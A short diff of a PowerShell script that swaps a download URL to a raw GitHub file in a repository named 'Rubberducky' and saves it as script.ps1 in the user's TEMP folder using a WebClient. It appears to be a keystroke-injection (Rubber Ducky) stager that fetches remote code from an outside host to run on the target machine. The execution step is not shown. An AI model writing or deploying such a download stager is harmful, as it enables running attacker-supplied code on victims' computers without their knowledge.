@@ -1,4 +1,4 @@
-$sourceUrl = "https://raw.githubusercontent.com/vitorcilira/0/main/1"
+$sourceUrl = "https://raw.githubusercontent.com/byshop04/Rubberducky/main/script.ps1"
 $destinationFile = "$env:TEMP\script.ps1"
 
 $webClient = New-Object System.Net.WebClient
